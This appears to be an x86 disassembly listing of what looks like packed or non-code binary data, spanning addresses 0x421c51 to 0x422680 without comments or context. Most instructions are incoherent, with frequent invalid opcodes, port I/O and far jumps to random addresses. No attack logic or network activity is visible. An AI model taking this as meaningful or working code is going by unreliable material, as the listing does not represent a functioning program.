  421c51:	jmp    0x421c9c
  421c53:	xchg   edi,eax
  421c54:	std    
  421c55:	dec    edi
  421c56:	fdiv   DWORD PTR [ebx]
  421c58:	in     eax,0xbe
  421c5a:	aaa    
  421c5b:	cmp    bh,BYTE PTR [edi+ebp*2]
  421c5e:	(bad)  
  421c5f:	inc    ebx
  421c60:	pop    ebp
  421c61:	or     esp,eax
  421c63:	in     eax,0x60
  421c65:	loopne 0x421c50
  421c67:	dec    esp
  421c68:	cli    
  421c69:	bound  ecx,QWORD PTR [esi+esi*1+0x44]
  421c6d:	mov    ah,0xaa
  421c6f:	xor    cl,BYTE PTR [ecx]
  421c71:	and    al,0xab
  421c73:	xchg   ebp,eax
  421c74:	xchg   edi,eax
  421c75:	jmp    0x421caf
  421c77:	icebp  
  421c78:	scas   eax,DWORD PTR es:[edi]
  421c79:	push   0x70
  421c7b:	push   es
  421c7c:	cmp    ebx,DWORD PTR [esi-0x73]
  421c7f:	aam    0xfa
  421c81:	or     ch,dl
  421c83:	jmp    0x421c1c
  421c85:	mov    edi,edx
  421c87:	(bad)  
  421c88:	cmp    al,BYTE PTR [edi-0x70]
  421c8b:	stc    
  421c8c:	rcr    esi,1
  421c8e:	add    ebx,0x1b
	...
  421cf4:	mov    al,0x6b
  421cf6:	mov    ch,0xe5
  421cf8:	(bad)  
  421cf9:	push   eax
  421cfb:	jg     0x421d51
  421cfd:	dec    edi
  421cfe:	xchg   edx,eax
  421cff:	dec    edi
  421d00:	xchg   dl,bl
  421d02:	or     al,0x77
  421d04:	shr    BYTE PTR [eax+0x1],0x0
  421d08:	add    eax,0x9000001
  421d0d:	repz and edx,ecx
  421d10:	loop   0x421cb7
  421d12:	aam    0x5f
  421d14:	call   0x34c8b36b
  421d19:	dec    esi
  421d1a:	in     eax,dx
  421d1b:	fimul  WORD PTR [edx]
  421d1d:	pusha  
  421d1e:	adc    eax,0xa0179f20
  421d23:	pusha  
  421d24:	test   eax,0xd0672c31
  421d29:	jmp    0x72d3e397
  421d2e:	rol    BYTE PTR [esi-0x686f8f0f],cl
  421d34:	arpl   WORD PTR [eax-0x3a0046b3],dx
  421d3a:	(bad)  
  421d3b:	xchg   edi,eax
  421d3c:	iret   
  421d3d:	lahf   
  421d3e:	fidivr DWORD PTR [edx+0xdd0e54e]
  421d44:	adc    DWORD PTR [ecx],esp
  421d46:	mov    DWORD PTR [ebx+0x78b2a1ca],ebx
  421d4c:	pushf  
  421d4d:	fnstsw WORD PTR [ebp+0x4c]
  421d50:	push   eax
  421d51:	mov    eax,0xb8c919d7
  421d56:	pusha  
  421d57:	sahf   
  421d58:	xchg   esi,eax
  421d59:	ficom  WORD PTR [esp+ebx*1-0x39]
  421d5d:	fs jp  0x421d56
  421d60:	sbb    DWORD PTR [edi+0x24],esi
  421d63:	aas    
  421d64:	pop    esp
  421d65:	or     eax,0x91ca7bbc
  421d6a:	lahf   
  421d6b:	and    dh,BYTE PTR [ecx]
  421d6d:	mov    ebx,0xd42095f9
  421d72:	loope  0x421d23
  421d74:	or     eax,0xaadec227
  421d79:	sub    dh,dl
  421d7b:	out    dx,eax
  421d7c:	inc    BYTE PTR [edx+0x3]
  421d7f:	pushf  
  421d80:	push   edi
  421d81:	add    BYTE PTR [edx-0x349a5c4],ah
  421d87:	ret    0x6f32
  421d8a:	push   ss
  421d8b:	xlat   BYTE PTR ds:[ebx]
  421d8c:	pop    ss
  421d8d:	retf   0xa9d4
  421d90:	scas   eax,DWORD PTR es:[edi]
  421d91:	pop    esi
  421d92:	scas   al,BYTE PTR es:[edi]
  421d93:	xor    esi,DWORD PTR [edi-0x11]
  421d96:	mov    eax,0x78fe0467
  421d9b:	mov    eax,ds:0xa476ed29
  421da0:	xchg   bh,dh
  421da2:	cmp    dh,bl
  421da4:	in     eax,dx
  421da5:	repnz fmul QWORD PTR [ebx-0x1f]
  421da9:	jb     0x421d47
  421dab:	std    
  421dac:	or     BYTE PTR [ebp+0x42],dh
  421daf:	icebp  
  421db0:	push   ecx
  421db1:	pushf  
  421db2:	mov    edx,0x724a114c
  421db7:	and    ah,dh
  421db9:	dec    edx
  421dba:	pop    ecx
  421dbb:	out    0xe0,al
  421dbd:	push   0x34
  421dbf:	sbb    DWORD PTR [ebx+0x47],esp
  421dc2:	and    eax,0x37b7e1bb
  421dc7:	sub    ebp,DWORD PTR [edx]
  421dc9:	stos   DWORD PTR es:[edi],eax
  421dca:	fld    TBYTE PTR [edi+0x1a698eae]
  421dd0:	mov    ebx,0x2ae6362e
  421dd5:	push   edi
  421dd6:	sbb    dl,BYTE PTR [esi-0x46e1b180]
  421ddc:	retf   0xf0c0
  421ddf:	xchg   BYTE PTR es:[edi+esi*8],bh
  421de3:	outs   dx,BYTE PTR ds:[esi]
  421de4:	and    DWORD PTR [ebp-0x52794172],esp
  421dea:	fisub  DWORD PTR ss:[edi-0x33]
  421dee:	xchg   edi,eax
  421def:	sbb    eax,0xf6426ee
  421df4:	and    cl,ah
  421df6:	xchg   ebx,eax
  421df7:	cwde   
  421df8:	dec    edx
  421df9:	in     eax,0xab
  421dfb:	popf   
  421dfc:	cld    
  421dfd:	clc    
  421dfe:	mov    DWORD PTR [ebp-0x4015247c],ebx
  421e04:	and    eax,0x8a3f2e59
  421e09:	sub    DWORD PTR [edi-0xbb1a447],edx
  421e0f:	jecxz  0x421e1e
	...
  421e71:	add    BYTE PTR [eax],al
  421e73:	add    bh,cl
  421e75:	mov    eax,ds:0xbf7f851b
  421e7a:	fucomip st,st(3)
  421e7c:	push   es
  421e7d:	ins    BYTE PTR es:[edi],dx
  421e7e:	xor    al,0xb9
  421e80:	loopne 0x421e25
  421e82:	jl     0x421e60
  421e84:	lds    ebp,FWORD PTR [ecx+0x1]
  421e87:	add    BYTE PTR ds:0x5000001,al
  421e8d:	sub    BYTE PTR [ebx+ebx*4+0x5d3e8b32],al
  421e94:	hlt    
  421e95:	loope  0x421f09
  421e97:	sbb    al,bh
  421e99:	mov    fs,WORD PTR [edi]
  421e9b:	outs   dx,BYTE PTR ds:[esi]
  421e9c:	jae    0x421ecf
  421e9e:	cmp    DWORD PTR [ecx+0x66],ecx
  421ea1:	add    al,0xd
  421ea3:	and    al,0xfd
  421ea5:	mov    ebp,0xf31db960
  421eaa:	div    BYTE PTR [edx-0x5cb2e114]
  421eb0:	mov    dh,0xc5
  421eb2:	mov    al,0xfa
  421eb4:	(bad)  
  421eb5:	clc    
  421eb6:	ins    BYTE PTR es:[edi],dx
  421eb7:	lods   eax,DWORD PTR ds:[esi]
  421eb8:	mov    eax,0x97d1091c
  421ebd:	sbb    BYTE PTR [edx],al
  421ebf:	dec    ecx
  421ec0:	add    DWORD PTR [edx],esi
  421ec2:	xlat   BYTE PTR ds:[ebx]
  421ec3:	mov    edi,0xb8b8097
  421ec8:	ficomp DWORD PTR [esi+0x702685c2]
  421ece:	push   ebp
  421ecf:	mov    dh,bh
  421ed1:	mov    ?,esi
  421ed3:	scas   al,BYTE PTR es:[edi]
  421ed4:	add    al,0xa2
  421ed6:	cmp    ah,ah
  421ed8:	je     0x421f41
  421eda:	adc    DWORD PTR [edi-0x4f],ecx
  421edd:	or     ah,BYTE PTR [edi-0x22e52771]
  421ee3:	out    dx,eax
  421ee4:	stos   BYTE PTR es:[edi],al
  421ee5:	adc    al,0x82
  421ee7:	daa    
  421ee8:	or     al,0xfb
  421eea:	scas   al,BYTE PTR es:[edi]
  421eeb:	push   es
  421eec:	ins    DWORD PTR es:[edi],dx
  421eed:	jmp    0x421eb3
  421eef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ef0:	in     al,0xcb
  421ef2:	adc    BYTE PTR [edi-0x7f],cl
  421ef5:	pop    ecx
  421ef6:	fldenv [esi-0x7fe73073]
  421efc:	rcr    DWORD PTR [ebx],0xb
  421eff:	push   edi
  421f00:	sub    bl,BYTE PTR [ebx-0x4]
  421f03:	mov    BYTE PTR [ebx+0x481a969a],bh
  421f09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f0a:	and    eax,0x46180cf9
  421f0f:	cwde   
  421f10:	jnp    0x421e9f
  421f12:	jb     0x421f23
  421f14:	mov    al,ds:0xe62e3fa4
  421f19:	imul   ecx,DWORD PTR [ecx],0xffffff9f
  421f1c:	pop    eax
  421f1e:	add    dl,BYTE PTR [ecx]
  421f20:	mul    DWORD PTR [esi]
  421f22:	xor    eax,DWORD PTR [esi-0x51]
  421f25:	loopne 0x421f11
  421f27:	mov    dh,0xe4
  421f29:	pusha  
  421f2a:	xor    eax,0x28f25c1a
  421f2f:	cmp    BYTE PTR [ebp-0x1987dda4],bh
  421f35:	xchg   DWORD PTR [eax-0x1a],edi
  421f38:	mov    esp,0x4e037108
  421f3d:	loope  0x421fb3
  421f3f:	jmp    0xc371c033
  421f44:	jo     0x421f0c
  421f46:	or     BYTE PTR [edi+0x50],dl
  421f49:	xor    BYTE PTR [ebp-0x32],ch
  421f4c:	push   ebp
  421f4d:	push   di
  421f4f:	mov    edi,0xf129fc95
  421f54:	mov    eax,ds:0x392000a5
  421f59:	inc    ecx
  421f5a:	cs ret 
  421f5c:	repz addr16 pop es
  421f5f:	lods   eax,DWORD PTR ds:[esi]
  421f60:	mov    DWORD PTR [edx+0x6e],0xac9ec7b6
  421f67:	jmp    0x6d524a16
  421f6c:	test   al,0x61
  421f6e:	in     al,dx
  421f6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f70:	or     BYTE PTR [ebx-0x2289bc7f],cl
  421f76:	loope  0x421f4f
  421f78:	bound  ecx,QWORD PTR [edx]
  421f7a:	dec    esi
  421f7b:	in     eax,dx
  421f7c:	xor    al,0xf1
  421f7e:	adc    BYTE PTR [ecx+0x3e],al
  421f81:	fs cmc 
  421f83:	call   0x783f0f16
  421f88:	mov    ds:0x1a2751af,eax
  421f8d:	std    
  421f8e:	xor    bl,al
  421f90:	xor    eax,DWORD PTR [eax]
	...
  421ff2:	add    BYTE PTR [eax],al
  421ff4:	imul   eax,DWORD PTR [esi],0xffffff8f
  421ff7:	dec    edi
  421ff8:	out    dx,eax
  421ff9:	iret   
  421ffa:	jmp    0x422022
  421ffc:	aas    
  421ffd:	in     eax,dx
  421ffe:	push   es
  421fff:	data16 sbb BYTE PTR [eax],dl
  422002:	call   0x500:0x16acaea
  422009:	add    DWORD PTR [eax],eax
  42200b:	add    BYTE PTR [edi],ah
  42200d:	pop    ds
  42200e:	cwde   
  42200f:	enter  0x1fa5,0x67
  422013:	pop    ds
  422014:	cdq    
  422015:	and    ah,BYTE PTR [esi-0x43]
  422018:	xchg   DWORD PTR [ecx],ecx
  42201a:	mov    BYTE PTR [edx+eax*8+0x51],dl
  42201e:	imul   ecx,eax,0x3bceb9fe
  422024:	adc    ch,BYTE PTR [esi-0x4f]
  422027:	in     eax,dx
  422028:	push   ecx
  422029:	jl     0x42207d
  42202b:	icebp  
  42202c:	stos   DWORD PTR es:[edi],eax
  42202d:	stos   BYTE PTR es:[edi],al
  42202e:	imul   BYTE PTR [ecx+edx*4]
  422031:	ds loopne 0x421fcc
  422034:	or     al,0x54
  422036:	xchg   ecx,ebp
  422038:	mov    al,0x4
  42203a:	pop    es
  42203b:	mov    dl,0x60
  42203d:	jge    0x422067
  42203f:	adc    DWORD PTR [edx-0x18],ebx
  422042:	dec    edi
  422043:	neg    DWORD PTR [edx-0x63a84c3b]
  422049:	dec    esi
  42204a:	mov    ds:0xbd048e1d,eax
  42204f:	shl    BYTE PTR [esp+ecx*1+0x67],0xbf
  422054:	lea    esi,[edx+0x669eac04]
  42205a:	mov    ebx,0x1ba65a2d
  42205f:	inc    edi
  422060:	test   eax,0x716e0884
  422065:	mov    dh,0x79
  422067:	dec    eax
  422068:	jle    0x42209b
  42206a:	push   esp
  42206b:	mov    WORD PTR [ebx],?
  42206d:	ret    
  42206e:	outs   dx,BYTE PTR ds:[esi]
  42206f:	jmp    0x422080
  422071:	sub    eax,0xfe9c295c
  422076:	pop    edi
  422077:	mov    ebp,0xd6498b81
  42207c:	push   ds
  42207d:	ret    0x68a6
  422080:	ins    BYTE PTR es:[edi],dx
  422081:	ins    DWORD PTR es:[edi],dx
  422082:	sub    al,0xec
  422084:	cs dec esp
  422086:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422087:	sub    DWORD PTR [edi-0x22],ebp
  42208a:	test   bh,cl
  42208c:	mov    edi,esi
  42208e:	push   ebp
  42208f:	dec    esi
  422090:	aaa    
  422091:	pop    ebp
  422092:	(bad)  
  422093:	int    0xf
  422095:	(bad)  
  422096:	lea    esp,[esi]
  422098:	inc    esp
  422099:	mov    eax,0x9418dc4d
  42209e:	sbb    BYTE PTR [edi+0x5e],ch
  4220a1:	jp     0x422038
  4220a3:	inc    ebp
  4220a4:	mov    ds:0x4ea4847b,al
  4220a9:	sub    ebp,DWORD PTR [eax]
  4220ab:	cmc    
  4220ac:	push   ebp
  4220ad:	inc    edi
  4220ae:	mov    esi,0xf6cdd74d
  4220b3:	outs   dx,BYTE PTR ds:[esi]
  4220b4:	or     DWORD PTR [ebp+0x50],eax
  4220b7:	xchg   ecx,eax
  4220b8:	ds loop 0x422097
  4220bb:	pop    ss
  4220bc:	mov    ebp,0x8d9ea75f
  4220c1:	cwde   
  4220c2:	push   eax
  4220c3:	pop    ebx
  4220c4:	idiv   DWORD PTR [eax+eiz*1-0x3feca389]
  4220cb:	push   cs
  4220cc:	jnp    0x4220af
  4220ce:	pop    ds
  4220cf:	shld   ebx,edi,cl
  4220d2:	sbb    bh,cl
  4220d4:	pop    eax
  4220d5:	leave  
  4220d6:	cmp    eax,0x69752c57
  4220db:	scas   al,BYTE PTR es:[edi]
  4220dc:	mov    ah,0x18
  4220de:	in     eax,dx
  4220df:	fld    DWORD PTR [edx+edi*1]
  4220e2:	mov    BYTE PTR [ebp-0x22],dh
  4220e5:	pop    edi
  4220e6:	and    al,0x83
  4220e8:	sahf   
  4220e9:	fiadd  DWORD PTR [esi-0x4c779989]
  4220ef:	xor    edx,DWORD PTR [edx-0xa2b540d]
  4220f5:	int    0xfe
  4220f7:	in     eax,dx
  4220f8:	push   0xe788cff8
  4220fd:	or     al,0x6e
  4220ff:	jns    0x42208b
  422101:	shr    BYTE PTR [edi],cl
  422103:	cmp    DWORD PTR ds:0x61dbed7e,esi
  422109:	sub    ebp,esp
  42210b:	or     eax,0x15f6bf42
  422110:	mov    es,WORD PTR [eax]
	...
  422172:	add    BYTE PTR [eax],al
  422174:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422175:	push   edx
  422176:	jnp    0x422175
  422178:	(bad)  
  422179:	std    
  42217a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42217b:	pop    ebx
  42217c:	dec    edx
  42217d:	sub    al,0x42
  42217f:	sub    esi,DWORD PTR [edx-0x2b]
  422182:	inc    ebx
  422183:	dec    edi
  422184:	iret   
  422185:	imul   eax,DWORD PTR [ecx],0x0
  422188:	add    eax,0xc000001
  42218d:	sub    dl,BYTE PTR [ebx+0x5e]
  422190:	cmp    dl,BYTE PTR [esp+edx*4]
  422193:	out    0x1d,eax
  422195:	mov    eax,ds:0x2d5404ef
  42219a:	stc    
  42219b:	fmulp  st(3),st
  42219d:	mov    edi,0x61b14cf4
  4221a2:	xor    DWORD PTR [eax-0x5731e001],eax
  4221a8:	add    ch,cl
  4221aa:	mov    cl,0xb6
  4221ac:	mov    al,ds:0x5076bf54
  4221b1:	dec    edi
  4221b2:	int    0x98
  4221b4:	pop    esi
  4221b5:	push   edx
  4221b6:	lods   al,BYTE PTR ds:[esi]
  4221b7:	aas    
  4221b8:	dec    ebp
  4221b9:	les    esp,FWORD PTR [ebp-0x22]
  4221bc:	repnz imul ebx,DWORD PTR [ebp+0x10],0x63ce61ec
  4221c4:	rol    BYTE PTR [ecx+ebp*1+0x4a99a21b],cl
  4221cb:	and    DWORD PTR [eax],ecx
  4221cd:	cdq    
  4221ce:	nop
  4221cf:	pop    ss
  4221d0:	fsubr  DWORD PTR [ecx+0x6a30a193]
  4221d6:	pusha  
  4221d7:	inc    ebp
  4221d8:	mov    eax,ds:0xea9a5322
  4221dd:	mov    ds:0x2e2bc0cb,al
  4221e2:	ins    BYTE PTR es:[edi],dx
  4221e3:	fcmovbe st,st(1)
  4221e5:	xor    DWORD PTR [ebx],0x3c
  4221e8:	add    DWORD PTR [edx+0x57],esi
  4221eb:	aaa    
  4221ec:	xor    edx,eax
  4221ee:	add    esi,ecx
  4221f0:	sbb    eax,0x524f71cf
  4221f5:	(bad)  
  4221f6:	jmp    0x2caf:0x60e66ed4
  4221fd:	mov    al,0x28
  4221ff:	adc    ch,cl
  422201:	mov    al,0xc3
  422203:	lock scas eax,DWORD PTR es:[edi]
  422205:	or     bh,BYTE PTR [edi]
  422207:	push   0xd720cf94
  42220c:	add    DWORD PTR [esi+0x4c],ebp
  42220f:	xchg   ebx,eax
  422210:	outs   dx,BYTE PTR ds:[esi]
  422211:	sub    BYTE PTR [edi+0x32b49912],0xc9
  422218:	inc    ecx
  422219:	add    ebx,DWORD PTR [edx-0x2aa657ee]
  42221f:	ja     0x42228c
  422221:	lock neg DWORD PTR [eax]
  422224:	add    eax,0x7f01458e
  422229:	mov    dl,0x88
  42222b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42222c:	sahf   
  42222d:	sahf   
  42222e:	jb     0x42228b
  422230:	lds    eax,FWORD PTR [edi]
  422232:	dec    esp
  422233:	scas   eax,DWORD PTR es:[edi]
  422234:	cli    
  422235:	daa    
  422236:	xchg   ebp,esp
  422238:	sub    dh,dl
  42223a:	add    DWORD PTR [eax+0x19],0xffffff8a
  42223e:	xchg   edi,eax
  42223f:	xor    eax,DWORD PTR [esi+0x743b16b4]
  422245:	leave  
  422246:	jae    0x4222ac
  422248:	dec    ebp
  422249:	mov    al,0x5f
  42224b:	int3   
  42224c:	and    esi,DWORD PTR [ebp-0x57]
  42224f:	lock cmp eax,0xcffffff8
  422255:	outs   dx,DWORD PTR ds:[esi]
  422256:	stos   DWORD PTR es:[edi],eax
  422257:	mov    ds:0x1f1bda5,al
  42225c:	mov    eax,0x5a456c00
  422261:	push   ecx
  422262:	pop    ds
  422263:	daa    
  422264:	daa    
  422265:	sbb    eax,0xaea971ad
  42226a:	xchg   esi,eax
  42226b:	ds pop ecx
  42226d:	inc    ecx
  42226e:	in     al,0x88
  422270:	dec    edi
  422271:	mov    ecx,0xf1e4fa7b
  422276:	mov    bh,0x6c
  422278:	leave  
  422279:	scas   eax,DWORD PTR es:[edi]
  42227a:	fcmovnb st,st(4)
  42227c:	ss mov eax,edi
  42227f:	cs inc eax
  422281:	and    DWORD PTR [ebp+0x50],esi
  422284:	xchg   edi,eax
  422285:	pop    es
  422286:	jmp    0x4222d5
  422288:	jmp    0xbabc:0xef97c143
  42228f:	mov    esp,?
	...
  4222f1:	add    BYTE PTR [eax],al
  4222f3:	add    BYTE PTR [edi-0x10085213],cl
  4222f9:	neg    edi
  4222fb:	std    
  4222fc:	sub    ebx,DWORD PTR [ebp+0x71]
  4222ff:	dec    ecx
  422300:	mov    ds:0xd404819e,eax
  422305:	ins    BYTE PTR es:[edi],dx
  422306:	add    DWORD PTR [eax],eax
  422308:	add    eax,0xe8000001
  42230d:	xchg   ebp,eax
  42230e:	gs or  al,0x85
  422311:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422313:	rcl    edi,0xba
  422316:	out    0xb,eax
  422318:	xor    eax,0xed5b0861
  42231d:	adc    DWORD PTR [edi],0xa
  422320:	xor    edi,0x62781dd4
  422326:	inc    esi
  422327:	inc    esp
  422328:	add    eax,0xf3180404
  42232d:	pop    ecx
  42232e:	inc    ecx
  42232f:	lds    edx,FWORD PTR [edi-0x3526dd8c]
  422335:	and    DWORD PTR [ecx-0x2d],esp
  422338:	sti    
  422339:	out    dx,eax
  42233a:	dec    edi
  42233b:	fwait
  42233c:	sbb    bh,BYTE PTR [edx]
  42233e:	rcl    esi,cl
  422340:	lods   eax,DWORD PTR ds:[esi]
  422341:	jmp    0x2c6cff15
  422346:	mov    edx,esp
  422348:	(bad)  
  422349:	popa   
  42234a:	outs   dx,BYTE PTR ds:[esi]
  42234b:	mov    bl,0xcb
  42234d:	push   0x6c
  42234f:	and    al,0xf4
  422351:	hlt    
  422352:	mov    cl,0xa1
  422354:	mov    BYTE PTR [edx+esi*8-0x161f7e55],al
  42235b:	out    dx,al
  42235c:	pop    es
  42235d:	es pop ss
  42235f:	out    dx,al
  422360:	jecxz  0x42230c
  422362:	or     DWORD PTR [edi+0x79],edx
  422365:	icebp  
  422366:	into   
  422367:	test   eax,0x2faca719
  42236c:	(bad)  
  42236d:	sbb    eax,DWORD PTR [ecx+ebx*2]
  422370:	inc    edx
  422371:	dec    ebx
  422372:	je     0x422302
  422374:	(bad)  
  422376:	push   edx
  422377:	pushf  
  422378:	arpl   sp,dx
  42237a:	sar    dl,1
  42237c:	xor    esi,DWORD PTR [edx+ebp*2+0x677c6506]
  422383:	rcr    DWORD PTR [edi-0x11f36309],cl
  422389:	mov    dx,0xf26b
  42238d:	lds    edi,FWORD PTR [esi-0x1da65128]
  422393:	lds    esp,FWORD PTR [eax+0x601b11b]
  422399:	(bad)
  42239d:	imul   ecx,DWORD PTR [edi+0x411cb975],0x84be9f10
  4223a7:	pusha  
  4223a8:	or     esp,esp
  4223aa:	outs   dx,BYTE PTR ds:[esi]
  4223ab:	cmp    DWORD PTR [edx-0x13],esp
  4223ae:	ficomp WORD PTR [esi]
  4223b0:	mov    bh,0x97
  4223b2:	div    BYTE PTR [ecx]
  4223b4:	data16 (bad) 
  4223b6:	xchg   esi,eax
  4223b7:	push   es
  4223b8:	fs ds dec edx
  4223bb:	popa   
  4223bc:	jge    0x42234d
  4223be:	pusha  
  4223bf:	sub    dh,ah
  4223c1:	add    BYTE PTR [edx+ebx*1],bh
  4223c4:	jns    0x422424
  4223c6:	fcomp  QWORD PTR [ecx+0x51d7db67]
  4223cc:	xlat   BYTE PTR gs:[ebx]
  4223ce:	add    BYTE PTR [esi+eiz*1],bh
  4223d1:	test   al,0xef
  4223d3:	mov    cl,0xab
  4223d5:	loop   0x42243e
  4223d7:	or     ebx,DWORD PTR [edx-0x650034f4]
  4223dd:	pop    esp
  4223de:	scas   eax,DWORD PTR es:[edi]
  4223df:	sub    eax,esp
  4223e1:	hlt    
  4223e2:	or     cl,BYTE PTR [eax+0x77a3f08e]
  4223e8:	aas    
  4223e9:	and    eax,DWORD PTR [ecx+0x2d722a9f]
  4223ef:	shr    BYTE PTR [edi+0x5b75896f],cl
  4223f5:	imul   edx,DWORD PTR [edi+0x4c58ebf1],0xffffffdb
  4223fc:	mov    ss,WORD PTR [esi-0x4a]
  4223ff:	(bad)  
  422400:	shl    BYTE PTR [ebx-0x42],1
  422403:	adc    al,0x50
  422405:	cs das 
  422407:	pop    esi
  422408:	idiv   bh
  42240a:	adc    DWORD PTR [ecx-0x3d3a0841],ebx
  422410:	push   ebp
	...
  422471:	add    BYTE PTR [eax],al
  422473:	add    BYTE PTR [edx-0x7e],dl
  422476:	cs imul edi,esi,0xbbbb57ed
  42247d:	xor    ebp,esp
  42247f:	cdq    
  422480:	fnsave [edx]
  422482:	nop
  422483:	daa    
  422484:	fldcw  WORD PTR [ebp+0x1]
  422487:	add    BYTE PTR ds:0xb0000001,al
  42248d:	xchg   ecx,eax
  42248e:	or     edi,DWORD PTR [eax-0x60]
  422491:	test   BYTE PTR [edx+0x25afd287],0xf4
  422498:	(bad)  
  422499:	fidiv  WORD PTR [edi-0x5085ea99]
  42249f:	lods   al,BYTE PTR ds:[esi]
  4224a0:	adc    dl,0x45
  4224a3:	mov    dh,0x63
  4224a5:	bound  ebx,QWORD PTR [esi-0x5c]
  4224a8:	xor    edi,DWORD PTR ss:[edx-0x96fd40e]
  4224af:	pop    esi
  4224b0:	loopne 0x4224ed
  4224b2:	pop    ds
  4224b3:	adc    ecx,ebx
  4224b5:	in     al,0x5a
  4224b7:	pop    es
  4224b8:	push   esp
  4224b9:	push   ss
  4224ba:	adc    cl,BYTE PTR [ecx+0x645a4a02]
  4224c0:	fdivr  QWORD PTR [ecx]
  4224c2:	jle    0x422507
  4224c4:	daa    
  4224c5:	pop    esp
  4224c6:	(bad)  
  4224c7:	pop    edi
  4224c8:	je     0x4224d1
  4224ca:	(bad)  
  4224cb:	out    0x30,al
  4224cd:	pop    eax
  4224ce:	outs   dx,BYTE PTR ds:[esi]
  4224cf:	adc    eax,0x12e5d95a
  4224d4:	mov    ecx,0x29403667
  4224d9:	adc    BYTE PTR [eax-0x24],cl
  4224dc:	add    al,0xb6
  4224de:	nop
  4224df:	in     eax,0x98
  4224e1:	retf   
  4224e2:	(bad)  
  4224e3:	mov    cl,0x23
  4224e5:	mov    ah,0x23
  4224e7:	cmp    ebx,DWORD PTR [ecx+eax*1]
  4224ea:	inc    eax
  4224eb:	add    DWORD PTR [ebx+0x1c46841b],esi
  4224f1:	cmp    DWORD PTR [edi],0x430508e8
  4224f7:	xchg   ebx,eax
  4224f8:	push   eax
  4224f9:	push   edi
  4224fa:	pop    di
  4224fc:	mov    ebp,0x3c4a87ef
  422501:	xchg   ecx,eax
  422502:	sub    DWORD PTR [ebp-0x5f4eb727],eax
  422508:	dec    edi
  422509:	fisub  WORD PTR [edi+0x67]
  42250c:	in     al,dx
  42250d:	shl    BYTE PTR [eax+0x62e14030],cl
  422513:	inc    edx
  422514:	pop    ebp
  422515:	fwait
  422516:	into   
  422517:	rol    BYTE PTR [edi+0x1e],cl
  42251a:	gs push ss
  42251c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42251d:	aas    
  42251e:	sbb    BYTE PTR [ecx-0x1bf80e9a],dl
  422524:	test   BYTE PTR [edx],dl
  422526:	mov    ah,0xf3
  422528:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422529:	dec    edi
  42252a:	jecxz  0x422565
  42252c:	pop    ebp
  42252d:	jecxz  0x42250a
  42252f:	popf   
  422530:	and    edi,esi
  422532:	jnp    0x422592
  422534:	pusha  
  422535:	fs fwait
  422537:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422538:	sbb    bh,al
  42253a:	jg     0x422521
  42253c:	div    DWORD PTR [eax-0x2d]
  42253f:	jnp    0x42250a
  422541:	ins    BYTE PTR es:[edi],dx
  422542:	lea    edi,[esi+0x3a]
  422545:	jp     0x4224e0
  422547:	sahf   
  422548:	lea    ecx,[ebx+0x5b2fa63c]
  42254e:	repnz dec ecx
  422550:	cmovae esp,DWORD PTR [edi+0x17]
  422554:	pusha  
  422555:	(bad)  
  422556:	jns    0x4225a0
  422558:	xor    ch,ch
  42255a:	dec    ebp
  42255b:	cwde   
  42255c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42255d:	paddsw mm7,QWORD PTR ds:0x2d7eca90
  422564:	cmc    
  422565:	mov    ds:0xae723dec,al
  42256a:	gs xchg edi,eax
  42256c:	inc    ecx
  42256d:	adc    al,0x58
  42256f:	inc    edi
  422570:	dec    edx
  422571:	xchg   ecx,eax
  422572:	jb     0x42258a
  422574:	dec    ecx
  422575:	in     eax,dx
  422576:	cli    
  422577:	push   es
  422578:	pop    eax
  422579:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42257a:	mov    ebp,0xeb7fe7b9
  42257f:	(bad)
  422583:	or     al,0x68
  422585:	pop    edx
  422586:	inc    edi
  422587:	push   ebx
  422588:	jno    0x422570
  42258a:	inc    ebx
  42258b:	cmp    ch,BYTE PTR [edx]
  42258d:	fdivrp st(5),st
  42258f:	push   ebp
  422590:	pushf  
	...
  4225f1:	add    BYTE PTR [eax],al
  4225f3:	add    BYTE PTR [edx-0x40887052],bl
  4225f9:	ja     0x4225f5
  4225fb:	out    dx,eax
  4225fc:	sbb    esi,DWORD PTR [ecx+0x5261a2f8]
  422602:	inc    esi
  422603:	out    dx,al
  422604:	fisubr WORD PTR [esi+0x1]
  422607:	add    BYTE PTR ds:0xe8000001,al
  42260d:	push   edx
  42260e:	imul   edx,edx,0x4d75569e
  422614:	xchg   esp,eax
  422615:	xor    BYTE PTR [edx-0x4f],bh
  422618:	cmp    DWORD PTR [ebx+0x34],ebx
  42261b:	and    BYTE PTR [esi+0x5db95c8a],dl
  422621:	fwait
  422622:	adc    dh,dh
  422624:	pop    ds
  422625:	dec    esi
  422626:	sbb    ebx,ecx
  422628:	dec    esp
  422629:	mov    esp,0x3b66e125
  42262e:	jne    0x422683
  422630:	xor    eax,DWORD PTR [ecx+ebp*8-0x3c]
  422634:	sub    eax,0xc29104af
  422639:	into   
  42263a:	outs   dx,DWORD PTR ds:[esi]
  42263b:	ins    DWORD PTR es:[edi],dx
  42263c:	mov    dh,0x82
  42263e:	xor    eax,0x5e72875a
  422643:	xor    al,0x75
  422645:	xor    al,0x59
  422647:	sbb    ebp,ebx
  422649:	mov    ?,WORD PTR [ebx-0x6c]
  42264c:	test   ah,ah
  42264e:	loopne 0x4225d0
  422650:	(bad)  
  422651:	cdq    
  422652:	mov    eax,ds:0xf471e3e
  422657:	jnp    0x422644
  422659:	fld    DWORD PTR [eax-0x7ec42f9a]
  42265f:	(bad)  
  422660:	rol    BYTE PTR [edi-0x5],0xa4
  422664:	xor    DWORD PTR [esi-0x7b],0xffffffb4
  422668:	mov    BYTE PTR [eax-0x55],dl
  42266b:	jb     0x422660
  42266d:	cmp    eax,DWORD PTR [ebp+0x4b91c03b]
  422673:	push   esi
  422674:	adc    eax,DWORD PTR [ecx-0x4c0fb4d6]
  42267a:	xor    BYTE PTR [ecx+0x11323a18],dh
  422680:	pop    es
